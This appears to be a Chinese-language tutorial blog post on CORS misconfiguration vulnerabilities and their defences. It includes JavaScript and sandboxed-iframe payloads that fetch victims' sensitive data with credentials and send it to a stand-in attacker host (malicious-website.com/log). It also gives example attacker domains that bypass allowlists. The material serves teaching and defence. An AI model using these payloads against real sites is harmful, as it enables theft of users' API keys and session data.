+++
draft = false
date = 2021-02-28T01:00:00+08:00
title = "web 安全之 CORS"
description = "web 安全之 CORS"
slug = ""
authors = []
tags = []
categories = ["web security"]
externalLink = ""
series = []
disableComments = true
+++

# Cross-origin resource sharing (CORS)

在本节中，我们将解释什么是跨域资源共享（`CORS`），并描述一些基于 `CORS` 的常见攻击示例，以及讨论如何防御这些攻击。


## CORS（跨域资源共享）是什么？

`CORS`（跨域资源共享）是一种浏览器机制，它允许对位于当前访问域之外的资源进行受控访问。它扩展并增加了同源策略的灵活性。然而，如果一个网站的 `CORS` 策略配置和实现不当，它也可能导致基于跨域的攻击。`CORS` 不是针对跨源攻击（例如跨站请求伪造 `CSRF`）的保护。


## Same-origin policy（同源策略）

同源策略是一种限制性的跨域规范，它限制了网站与源域之外资源交互的能力。同源策略是多年前定义的，用于应对潜在的恶意跨域交互，例如一个网站从另一个网站窃取私人数据。它通常允许域向其他域发出请求，但不允许访问响应。

更多内容请参考 [Same-origin-policy](./Same-origin-policy.md) 。

## 同源策略的放宽

同源策略具有很大的限制性，因此人们设计了很多方法去规避这些限制。许多网站与子域或第三方网站的交互方式要求完全的跨域访问。使用跨域资源共享（`CORS`）可以有控制地放宽同源策略。

`CORS` 协议使用一组 HTTP header 来定义可信的 web 域和相关属性，例如是否允许通过身份验证的访问。浏览器和它试图访问的跨域网站之间进行这些 header 的交换。

更多内容请参考 [CORS and the Access-Control-Allow-Origin response header](./Access-control-allow-origin.md) 。

## CORS 配置不当引发的漏洞

现在许多网站使用 `CORS` 来允许来自子域和可信的第三方的访问。他们对 `CORS` 的实现可能包含有错误或过于放宽，这可能导致可利用的漏洞。


### 服务端 ACAO 直接返回客户端的 Origin

有些应用程序需要允许很多其它域的访问。维护一个允许域的列表需要付出持续的努力，任何差错都有可能造成破坏。因此，应用程序可能使用一些更加简单的方法来达到最终目的。

一种方法是从请求头中读取 `Origin`，然后将其作为 `Access-Control-Allow-Origin` 响应头返回。例如，应用程序接受了以下请求：
```
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
```

然后，其响应：
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
```

响应头表明允许从请求域进行访问，并且跨域请求可以包括 cookies（`Access-Control-Allow-Credentials: true`），因此浏览器将会在会话中进行处理。

由于应用程序在 `Access-Control-Allow-Origin` 头中直接返回了请求域，这意味着任何域都可以访问资源。如果响应中包含了任何敏感信息，如 API key 或者 CSRF token 则都可以被获取，你可以在你的网站上放置以下脚本进行检索：
```
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='//malicious-website.com/log?key='+this.responseText;
};
```


### Origin 处理漏洞

某些应用程序使用白名单机制来实现可信来源的访问允许。当收到 CORS 请求时，将请求头中的 origin 与白名单进行比较，如果在白名单中，则在 `Access-Control-Allow-Origin` 头中返回请求的 origin 以允许其跨域访问。例如，应用程序收到了如下的请求：
```
GET /data HTTP/1.1
Host: normal-website.com
...
Origin: https://innocent-website.com
```

应用程序检查白名单列表，如果 origin 在表中，则响应：
```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://innocent-website.com
```

在实现 CORS origin 白名单时很可能会犯一些失误。某个组织决定允许从其所有子域（包括尚未存在的未来子域）进行访问。应用程序允许从其他组织的域（包括其子域）进行访问。这些规则通常通过匹配 URL 前缀或后缀，或使用正则表达式来实现。实现中的任何失误都可能导致访问权限被授予意外的外部域。

例如，假设应用程序允许以下结尾的所有域的访问权限：
```
normal-website.com
```
攻击者则可以通过注册以下域来获得访问权限（结尾匹配）：
```
hackersnormal-website.com
```

或者应用程序允许以下开头的所有域的访问权限：
```
normal-website.com
```
攻击者则可以使用以下域获得访问权限（开头匹配）：
```
normal-website.com.evil-user.net
```


### Origin 白名单允许 null 值

浏览器会在以下情况下发送值为 null 的 Origin 头：
- 跨站点重定向
- 来自序列化数据的请求
- 使用 `file:` 协议的请求
- 沙盒中的跨域请求

某些应用程序可能会在白名单中允许 null 以方便本地开发。例如，假设应用程序收到了以下跨域请求：
```
GET /sensitive-victim-data
Host: vulnerable-website.com
Origin: null
```

服务器响应：
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

在这种情况下，攻击者可以使用各种技巧生成 Origin 为 null 的请求以通过白名单，从而获得访问权限。例如，可以使用 `iframe` 沙盒进行跨域请求：
```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe>
```

### 通过 CORS 信任关系利用 XSS

`CORS` 会在两个域之间建立信任关系，即使 `CORS` 是正确的配置，但是如果某个受信任的网站存在 XSS 漏洞，那么攻击者就可以利用 XSS 漏洞注入脚本，进而从受信任的网站上获取敏感信息。

假设请求为：
```
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: https://subdomain.vulnerable-website.com
Cookie: sessionid=...
```

如果服务器响应：
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

那么攻击者可以通过 `subdomain.vulnerable-website.com` 网站上的 XSS 漏洞去获取一些敏感数据：
```
https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
```


### 使用配置有问题的 CORS 中断 TLS

假设一个严格使用 HTTPS 的应用程序也通过白名单信任了一个使用 HTTP 的子域。例如，当应用程序收到以下请求时：
```
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: http://trusted-subdomain.vulnerable-website.com
Cookie: sessionid=...
```

应用程序响应：
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

在这种情况下，能够拦截受害者用户流量的攻击者可以利用 CORS 来破坏受害者与应用程序的正常交互。攻击步骤如下：
- 受害者用户发出任何纯 HTTP 请求。
- 攻击者将重定向注入到：`http://trusted-subdomain.vulnerable-website.com`
- 受害者的浏览器遵循重定向。
- 攻击者截获纯 HTTP 请求，返回伪造的响应给受害者，并发出恶意的 CORS 请求给：`https://vulnerable-website.com`
- 受害者的浏览器发出 CORS 请求，origin 为：`http://trusted-subdomain.vulnerable-website.com`
- 应用程序允许请求，因为这是一个白名单域，请求的敏感数据在响应中返回。
- 攻击者的欺骗页面可以读取敏感数据并将其传输到攻击者控制下的任何域。

即使易受攻击的网站对 HTTPS 的使用没有漏洞，并且没有 HTTP 端点，同时所有 Cookie 都标记为安全，此攻击也是有效的。


### 内网和无凭证的 CORS

大部分 `CORS` 攻击都需要以下响应头的存在：
```
Access-Control-Allow-Credentials: true
```

没有这个响应头，受害者的浏览器将不会发送 cookies ，这意味着攻击者只能访问无需用户验证的内容，而这些内容直接访问目标网站就可以轻松获得。

然而，有一种情况下攻击者无法直接访问网站：网站是内网，并且是私有 IP 地址空间。内网的安全标准通常低于外网，这使得攻击者发现漏洞后可以获得进一步的访问权限。例如，某个私有网络中的跨域请求：
```
GET /reader?url=doc1.pdf
Host: intranet.normal-website.com
Origin: https://normal-website.com
```

服务器响应：
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
```

服务器信任所有来源的跨域请求，而且无需凭证。如果私有IP地址空间内的用户访问公共互联网，则可以从外部站点执行基于 CORS 的攻击，该站点使用受害者的浏览器作为访问内网资源的代理。


## 如何防护基于 CORS 的攻击

`CORS` 漏洞主要是由于错误的配置而产生的，因此防护措施主要也是如何进行正确配置的问题。下面将会描述一些有效的方法。


### 跨域请求的正确配置

如果 web 资源包含敏感信息，那么应该在 `Access-Control-Allow-Origin` 头中声明允许的来源。


### 只允许受信任的站点

`Access-Control-Allow-Origin` 头只能是受信任的站点。`Access-Control-Allow-Origin` 直接使用跨域请求的 origin 而不验证是很容易被利用的，应该避免。


### 白名单中避免 null

避免 `Access-Control-Allow-Origin: null` 。来自内部文档和沙盒请求的跨域资源调用可以指定 origin 为 null 的。CORS 头应该根据私有和公共服务器的可信来源正确定义。


### 避免在内部网络中使用通配符

避免在内部网络中使用通配符。当内部浏览器可以访问不受信任的外部域时，仅仅依靠网络配置来保护内部资源是不够的。


### CORS 不是服务端安全策略的替代品

`CORS` 定义的只是浏览器行为，永远不能替代服务端对敏感数据的保护，毕竟攻击者可以直接在其它环境中伪造来自任何 origin 的请求。因此，除了正确配置的 CORS 之外，web 服务端仍然需要使用诸如身份验证和会话管理等措施对敏感数据进行保护。